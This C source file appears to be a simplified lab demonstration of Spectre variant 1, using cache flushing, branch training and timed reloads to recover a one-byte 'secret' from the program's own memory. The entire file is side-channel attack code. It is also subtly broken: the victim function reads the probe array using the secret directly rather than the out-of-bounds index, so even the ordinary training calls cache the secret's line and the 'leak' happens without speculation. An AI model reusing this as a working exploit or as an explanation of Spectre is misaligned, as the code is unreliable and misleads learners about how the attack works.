// spectre variant 1

#include <stdio.h>
#include <stdint.h>
#include <intrin.h>

#define CACHE_THRESHOLD 80  // CPU cycles to distinguish hit vs miss
#define STRIDE 512          // Offset to prevent hardware prefetching

uint8_t target_array[256 * STRIDE];
uint8_t secret_data = 42;    // This is the "secret" we want to leak
size_t boundary = 10;        // The "legal" limit for access

/**
 * The Victim Function
 * The CPU may speculatively execute the line inside the 'if' even if
 * index >= boundary, provided the branch predictor is "trained."
 */
void victim_function(size_t index) 
{
    if (index < boundary) 
    {
        // Speculative access based on secret_data
        volatile uint8_t dummy = target_array[secret_data * STRIDE];
    }
}

int main() 
{
    unsigned int junk = 0;
    size_t malicious_index = 999; // Clearly out of bounds

    // Initialize target_array to ensure it's mapped in memory
    for (int i = 0; i < 256; i++) 
        target_array[i * STRIDE] = 1;

    // --- STEP 1: FLUSH ---
    // Ensure the secret-dependent index is not in the cache
    for (int i = 0; i < 256; i++)
    {
        _mm_clflush(&target_array[i * STRIDE]);
    }
    _mm_mfence(); // Memory fence to ensure flush completes

    // --- STEP 2: TRIGGER ---
    // Train the predictor with "legal" calls (optional in simple labs)
    for (int i = 0; i < 10; i++) 
        victim_function(i);
    
    // Now call with out-of-bounds index
    _mm_clflush(&boundary); // Force CPU to speculate while waiting for 'boundary'
    _mm_mfence();
    victim_function(malicious_index);

    // --- STEP 3: RELOAD & TIME ---
    // We check which index in target_array was pulled into the cache
    printf("Testing cache hits:\n");
    for (int i = 0; i < 256; i++) 
    {
        uint64_t t1 = __rdtscp(&junk);
        volatile uint8_t val = target_array[i * STRIDE];
        uint64_t t2 = __rdtscp(&junk);

        uint64_t access_time = t2 - t1;

        if (access_time < CACHE_THRESHOLD && i != 0) 
        {
            printf("Cache Hit at index [%d]! Time: %llu cycles\n", i, access_time);
            printf("The secret data leaked is: %d\n", i);
        }
    }

    return 0;
}